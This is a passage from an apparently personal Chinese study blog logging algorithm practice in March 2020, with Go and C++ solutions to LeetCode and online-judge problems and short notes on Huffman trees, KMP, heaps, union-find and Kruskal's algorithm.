 <span class="keyword">if</span>(dp[m]!=m) <span class="built_in">printf</span>(<span class="string">&quot;No Solution&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> k=n,num=<span class="number">0</span>,v=m;</span><br><span class="line">        <span class="keyword">while</span>(k&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(choice[k][v]==<span class="literal">true</span>)&#123;</span><br><span class="line">                flag[k]=<span class="literal">true</span>;</span><br><span class="line">                v-=c[k];</span><br><span class="line">                num++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> flag[k]=<span class="literal">false</span>;</span><br><span class="line">            k--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(flag[i]==<span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,c[i]);</span><br><span class="line">                num--;</span><br><span class="line">                <span class="keyword">if</span>(num&gt;<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-3-13"><a href="#2020-3-13" class="headerlink" title="2020/3/13"></a>2020/3/13</h3><p>我太难了，这两天在准备开题，还学了不少web，尽然咕了</p>
<h4 id="leetcode-1071-字符串的最大公因子-Go"><a href="#leetcode-1071-字符串的最大公因子-Go" class="headerlink" title="leetcode 1071. 字符串的最大公因子_Go"></a>leetcode 1071. 字符串的最大公因子_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 辗转相除法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mod</span><span class="params">(str1 <span class="keyword">string</span>, str2 <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> remain <span class="keyword">string</span> = str1</span><br><span class="line">	length := <span class="built_in">len</span>(str2)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(remain) &lt; length || remain[:length] != str2 &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		remain = remain[length:]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> remain</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">gcdOfStrings</span><span class="params">(str1 <span class="keyword">string</span>, str2 <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(str1) &lt; <span class="built_in">len</span>(str2) &#123;</span><br><span class="line">		str1, str2 = str2, str1</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> remain <span class="keyword">string</span> = mod(str1, str2)</span><br><span class="line">	<span class="keyword">if</span> remain == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> str2</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> remain == str1 &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> gcdOfStrings(str2, remain)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> s1 <span class="keyword">string</span> = <span class="string">&quot;ABCABC&quot;</span></span><br><span class="line">	<span class="keyword">var</span> s2 <span class="keyword">string</span> = <span class="string">&quot;ABC&quot;</span></span><br><span class="line">	result := gcdOfStrings(s1, s2)</span><br><span class="line">	fmt.Println(result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-3-14"><a href="#2020-3-14" class="headerlink" title="2020/3/14"></a>2020/3/14</h3><h4 id="leetcode-121-买卖股票的最佳时机-Go"><a href="#leetcode-121-买卖股票的最佳时机-Go" class="headerlink" title="leetcode 121. 买卖股票的最佳时机_Go"></a>leetcode 121. 买卖股票的最佳时机_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 暴力显然可以，但阿弥陀佛，能不暴力还是不暴力了</span></span><br><span class="line"><span class="comment">// 第一步：找到最低价位</span></span><br><span class="line"><span class="comment">// 第二步：找到最大差价，且有日期限制，不可穿越时空</span></span><br><span class="line"><span class="comment">// 之前应该用py写过，用go在加深一遍go语法的印象</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxProfit</span><span class="params">(prices []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	profit := <span class="number">0</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(prices) &lt;= <span class="number">1</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> profit</span><br><span class="line">	&#125;</span><br><span class="line">	min := prices[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(prices); i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> prices[i] &lt; min &#123;</span><br><span class="line">			min = prices[i]</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> profit &lt; prices[i]-min &#123;</span><br><span class="line">			profit = prices[i] - min</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> profit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> prices = []<span class="keyword">int</span>&#123;<span class="number">7</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">4</span>&#125;</span><br><span class="line">	result := maxProfit(prices)</span><br><span class="line">	fmt.Println(result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-3-17"><a href="#2020-3-17" class="headerlink" title="2020/3/17"></a>2020/3/17</h3><h4 id="codeup-21142-C-哈夫曼树"><a href="#codeup-21142-C-哈夫曼树" class="headerlink" title="codeup 21142_C(哈夫曼树)"></a>codeup 21142_C(哈夫曼树)</h4><p>学一手哈夫曼树，其实不怎么复杂，掌握有优先级的队列就好</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//Codeup_21142</span></span><br><span class="line">priority_queue&lt;<span class="keyword">long</span> <span class="keyword">long</span>,vector&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt;,greater&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt;&gt; q;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> n,x,y,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;temp);</span><br><span class="line">        q.<span class="built_in">push</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>()&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        x=q.<span class="built_in">top</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        y=q.<span class="built_in">top</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        q.<span class="built_in">push</span>(x+y);</span><br><span class="line">        ans+=x+y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="AVL-tips"><a href="#AVL-tips" class="headerlink" title="AVL_tips"></a>AVL_tips</h4><p>以前写过，就理一下思路</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">node* <span class="title">newNode</span><span class="params">(<span class="keyword">int</span> v)</span></span>; <span class="comment">//生成一个结点</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHeight</span><span class="params">(node *root)</span></span>; <span class="comment">//获取结点高度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getBalanceFactor</span><span class="params">(node *root)</span></span>; <span class="comment">//获取平衡因子</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">updateHeight</span><span class="params">(node *root)</span></span>; <span class="comment">//更新高度</span></span><br><span class="line">左旋+右旋函数</span><br></pre></td></tr></table></figure>

<h4 id="HeapSort-tips"><a href="#HeapSort-tips" class="headerlink" title="HeapSort_tips"></a>HeapSort_tips</h4><p>记录一下重要的函数，其余按照堆排序的逻辑来不会出错的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">downAdjust</span><span class="params">(<span class="keyword">int</span> low,<span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=low;</span><br><span class="line">    <span class="keyword">int</span> j=i*<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=high)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j+<span class="number">1</span>&lt;=high&amp;&amp;heap[j+<span class="number">1</span>]&gt;heap[j])&#123;</span><br><span class="line">            j=j+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(heap[i]&lt;heap[j])&#123;</span><br><span class="line">            <span class="built_in">swap</span>(heap[j],heap[i]);</span><br><span class="line">            i=j;</span><br><span class="line">            j=j*<span class="number">2</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            breal;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="并查集-tips"><a href="#并查集-tips" class="headerlink" title="并查集_tips"></a>并查集_tips</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>; <span class="comment">//初始化isRoot与father数组</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findFather</span><span class="params">(<span class="keyword">int</span> v)</span></span>&#123;  <span class="comment">//找到祖先，合并路径</span></span><br><span class="line">    <span class="keyword">if</span>(v==father[v]) <span class="keyword">return</span> v;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> F=<span class="built_in">findFather</span>(father[v]);</span><br><span class="line">        father[v]=F;</span><br><span class="line">        <span class="keyword">return</span> F;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span> <span class="comment">//合并父亲结点</span></span></span><br></pre></td></tr></table></figure>

<h4 id="Kruskal最小生成树-边贪心-tips"><a href="#Kruskal最小生成树-边贪心-tips" class="headerlink" title="Kruskal最小生成树(边贪心)_tips"></a>Kruskal最小生成树(边贪心)_tips</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kruskal</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>&#123; <span class="comment">// n是顶点数，m是边数</span></span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>,Num_Edge=<span class="number">0</span>; <span class="comment">// 最小生成树边权之和，当前边数</span></span><br><span class="line">    <span class="comment">// 将所有边权从小到大排序</span></span><br><span class="line">    <span class="keyword">for</span>（从小到大枚举所有边）&#123;</span><br><span class="line">        <span class="keyword">if</span>(当前测试边两个端点不在一个连通块内)&#123;</span><br><span class="line">            <span class="comment">// 将该测试边加入最小生成树</span></span><br><span class="line">    		<span class="comment">// ans+=测试边的边权</span></span><br><span class="line">    		<span class="comment">// 最小生成树的当前边数 Num_Edge+1</span></span><br><span class="line">    		<span class="keyword">if</span>(Num_Edge&lt;n<span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2020-3-19"><a href="#2020-3-19" class="headerlink" title="2020/3/19"></a>2020/3/19</h3><h4 id="ECNU-OJ-35-零元素占比"><a href="#ECNU-OJ-35-零元素占比" class="headerlink" title="ECNU_OJ_35. 零元素占比"></a>ECNU_OJ_35. 零元素占比</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 100</span></span><br><span class="line"><span class="comment">//int (*p)[M]定义的数组指针，表示定义一个指针变量，</span></span><br><span class="line"><span class="comment">//此指针变量是指向一个含有M个元素的一维数组</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Ratio</span><span class="params">(<span class="keyword">int</span> (*p)[M], <span class="keyword">int</span> n, <span class="keyword">int</span> m)</span></span></span><br><span class="line"><span class="function"><span class="comment">/* PreCondition:</span></span></span><br><span class="line"><span class="comment"><span class="function"> p points to a two-dimensional array with n lines and m integers in each line</span></span></span><br><span class="line"><span class="comment"><span class="function">    PostCondition: array is sorted satisfying to the specification</span></span></span><br><span class="line"><span class="comment"><span class="function">*/</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> sum = n*m;</span><br><span class="line">    <span class="keyword">double</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">            <span class="comment">//printf(&quot;%d\n&quot;,*(*(p+i)+j));</span></span><br><span class="line">            <span class="keyword">if</span> (*(*(p+i)+j)==<span class="number">0</span>)</span><br><span class="line">                count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count/sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">100</span>][M], m, n, i, j;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i][j]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.9f\n&quot;</span>, <span class="built_in">Ratio</span>(a, n, m));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="ECNU-OJ-3441-唐纳德与子串-Easy"><a href="#ECNU-OJ-3441-唐纳德与子串-Easy" class="headerlink" title="ECNU_OJ_3441. 唐纳德与子串 (Easy)"></a>ECNU_OJ_3441. 唐纳德与子串 (Easy)</h4><p>不管是不是easy，反正用KMP做，学习一波，我们可以看到hard级难度是只能用kmp实现的</p>
<h5 id="kmp算法"><a href="#kmp算法" class="headerlink" title="kmp算法"></a>kmp算法</h5><p>仅仅后移模式串；指针不回溯；找出公共前后缀</p>
<p>公共前后缀的条件为：</p>
<p>1、最长的前后缀</p>
<p>2、长度小于指针前所有字符长度</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> l,r,p;</span><br><span class="line"><span class="keyword">int</span> next1[<span class="number">100000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getNext</span><span class="params">(string str,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">-1</span>;</span><br><span class="line">    next1[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(j!=<span class="number">-1</span>&amp;&amp;str[i]!=str[j+<span class="number">1</span>])&#123;</span><br><span class="line">            j=next1[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(str[i]==str[j+<span class="number">1</span>])&#123;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        next1[i]=j;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">KMP</span><span class="params">(string text,string pattern)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n=text.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">int</span> m=pattern.<span class="built_in">length</span>();</span><br><span class="line">    <span class="built_in">getNext</span>(pattern,m);</span><br><span class="line">    <span class="keyword">int</span> j=<span class="number">-1</span>,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(j!=<span class="number">-1</span>&amp;&amp;text[i]!=pattern[j+<span class="number">1</span>])&#123;</span><br><span class="line">            j=next1[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(text[i]==pattern[j+<span class="number">1</span>])&#123;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j==m<span class="number">-1</span>)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">            j=next1[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string s,z;</span><br><span class="line">    string temp;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line">    <span class="comment">//cout&lt;&lt;s&lt;&lt;endl;</span></span><br><span class="line">    cin&gt;&gt;p;</span><br><span class="line">    <span class="comment">//cout&lt;&lt;p&lt;&lt;endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;p;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;l&gt;&gt;r&gt;&gt;z;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;l&lt;&lt;&quot; &quot;&lt;&lt;r&lt;&lt;&quot; &quot;&lt;&lt;z&lt;&lt;endl;</span></span><br><span class="line">        temp=s;</span><br><span class="line">        temp=s.<span class="built_in">substr</span>(l,r-l+<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//cout&lt;&lt;temp.size()&lt;&lt;endl&lt;&lt;endl;</span></span><br><span class="line">        <span class="built_in">memset</span>(next1,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(next1));</span><br><span class="line">        <span class="keyword">int</span> ans=<span class="built_in">KMP</span>(temp,z);</span><br><span class="line">        cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这代码放到hard里面是通不过的，心酸，不过知道kmp咋做就好了</p>
<h3 id="2020-3-21"><a href="#2020-3-21" class="headerlink" title="2020/3/21"></a>2020/3/21</h3><h4 id="leetcode-169-多数元素-Go"><a href="#leetcode-169-多数元素-Go" class="headerlink" title="leetcode 169. 多数元素_Go"></a>leetcode 169. 多数元素_Go</h4><p>刷个水题热热手，最近一直在看英语和GO</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">majorityElement</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	Hash := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(nums); i++ &#123;</span><br><span class="line">		Hash[nums[i]]++</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> key, value := <span class="keyword">range</span> Hash &#123;</span><br><span class="line">		<span class="keyword">if</span> value &gt; <span class="built_in">len</span>(nums)/<span class="number">2</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> key</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> input = [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">3</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">	ans := majorityElement(input[:])</span><br><span class="line">	fmt.Println(ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>接下来展示一个别人的神仙做法</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">majorityElement</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    sort.Ints(nums)</span><br><span class="line">    <span class="keyword">return</span> nums[<span class="built_in">len</span>(nums)/<span class="number">2</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>人与人的差距怎么就这么大呢</p>
<h3 id="2020-3-22"><a href="#2020-3-22" class="headerlink" title="2020/3/22"></a>2020/3/22</h3><h4 id="leetcode-409-最长回文串-Go"><a href="#leetcode-409-最长回文串-Go" class="headerlink" title="leetcode 409. 最长回文串_Go"></a>leetcode 409. 最长回文串_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;unicode&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 求能组成的最长回文串</span></span><br><span class="line"><span class="comment">// 我想到的就是配对，然后可以再多带一个单一字符</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">longestPalindrome</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> Hash [<span class="number">52</span>]<span class="keyword">int</span></span><br><span class="line">	count := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> _, value := <span class="keyword">range</span> s &#123;</span><br><span class="line">		<span class="comment">// 若是大写</span></span><br><span class="line">		<span class="keyword">if</span> unicode.IsUpper(value) &#123;</span><br><span class="line">			value -= <span class="string">&#x27;A&#x27;</span></span><br><span class="line">			<span class="comment">//fmt.Println(value)</span></span><br><span class="line">			Hash[value]++</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			value -= <span class="string">&#x27;a&#x27;</span></span><br><span class="line">			value += <span class="number">26</span></span><br><span class="line">			Hash[value]++</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> _, value := <span class="keyword">range</span> Hash &#123;</span><br><span class="line">		count += value / <span class="number">2</span> * <span class="number">2</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> count == <span class="built_in">len</span>(s) &#123;</span><br><span class="line">		<span class="keyword">return</span> count</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> count + <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> str <span class="keyword">string</span></span><br><span class="line">	fmt.Scanf(<span class="string">&quot;%s&quot;</span>, &amp;str)</span><br><span class="line">	<span class="comment">//fmt.Println(str)</span></span><br><span class="line">	ans := longestPalindrome(str)</span><br><span class="line">	fmt.Println(ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-3-26"><a href="#2020-3-26" class="headerlink" title="2020/3/26"></a>2020/3/26</h3><h4 id="leetcode-876-链表的中间结点-Go"><a href="#leetcode-876-链表的中间结点-Go" class="headerlink" title="leetcode 876. 链表的中间结点_Go"></a>leetcode 876. 链表的中间结点_Go</h4><p>典型的two pointer，快慢指针</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ListNode struct</span></span><br><span class="line"><span class="keyword">type</span> ListNode <span class="keyword">struct</span> &#123;</span><br><span class="line">	Val  <span class="keyword">int</span></span><br><span class="line">	Next *ListNode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> head = &amp;ListNode&#123;</span><br><span class="line">	<span class="number">0</span>,</span><br><span class="line">	<span class="literal">nil</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pre = head</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">create</span><span class="params">(input []<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(input); i++ &#123;</span><br><span class="line">		<span class="keyword">var</span> temp = 